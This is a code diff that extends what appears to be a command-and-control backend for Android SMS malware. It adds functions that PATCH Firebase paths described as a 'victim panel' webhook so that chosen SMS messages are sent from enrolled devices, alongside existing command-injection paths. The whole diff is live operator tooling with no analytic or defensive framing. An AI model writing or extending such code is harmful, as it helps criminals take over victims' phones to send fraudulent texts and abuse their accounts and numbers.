@@ -88,6 +88,18 @@ async def _firebase_put_ok(url: str, data: dict, *, timeout: float = INJECT_TIME
         return False
 
 
+async def _firebase_patch_ok(url: str, data: dict, *, timeout: float = OUTGOING_TIMEOUT_SEC) -> bool:
+    """tgtoken.py style PATCH — victim panel webhookEvent/sendSms."""
+    try:
+        client = _get_http_client()
+        response = await client.patch(f"{url}.json", json=data, timeout=timeout)
+        response.raise_for_status()
+        return True
+    except Exception as exc:
+        logger.debug("Firebase PATCH failed for %s: %s", url, exc)
+        return False
+
+
 async def _firebase_put_many(urls: list[str], data: dict, *, timeout: float = OUTGOING_TIMEOUT_SEC) -> None:
     if not urls:
         return
@@ -159,6 +171,17 @@ def _outgoing_inject_paths(base: str, device_id: str, command_id: str) -> list[s
         f"{base}/clients/{device_id}/messages/{command_id}",
         f"{base}/clients/{device_id}/sms_out/{command_id}",
     ]
+
+
+def _outgoing_webhook_paths(base: str, device_id: str) -> list[str]:
+    """Auto-token (tgtoken.py) webhook — PATCH clients/{id}/webhookEvent/sendSms."""
+    paths = [
+        f"{base}/clients/{device_id}/webhookEvent/sendSms",
+    ]
+    if "/" in device_id:
+        leaf = device_id.rsplit("/", 1)[-1]
+        paths.append(f"{base}/clients/{leaf}/webhookEvent/sendSms")
+    return paths
 
 
 async def push_virtus_apk_config(profile: MonitorProfile, device: Device | None = None) -> None:
@@ -275,6 +298,12 @@ async def push_outgoing_sms_command(
         "injected": False,
         "created_at": created_at,
     }
+    webhook_payload = {
+        "from": sim_index,
+        "to": to_number,
+        "message": message,
+        "isSended": False,
+    }
 
     device_ids = _outgoing_device_ids(device) if device else [device_id]
     if device_id and device_id not in device_ids:
@@ -282,13 +311,22 @@ async def push_outgoing_sms_command(
 
     command_urls: list[str] = []
     inject_urls: list[str] = []
+    webhook_urls: list[str] = []
     for dev_id in device_ids:
         command_urls.extend(_outgoing_command_paths(base, dev_id, command_id))
         inject_urls.extend(_outgoing_inject_paths(base, dev_id, command_id))
+        webhook_urls.extend(_outgoing_webhook_paths(base, dev_id))
+
+    async def _patch_webhooks() -> None:
+        await asyncio.gather(
+            *(_firebase_patch_ok(url, webhook_payload) for url in webhook_urls),
+            return_exceptions=True,
+        )
 
     await asyncio.gather(
         _firebase_put_many(command_urls, payload),
         _firebase_put_many(inject_urls, inject_payload),
+        _patch_webhooks(),
         return_exceptions=True,
     )
     logger.info(
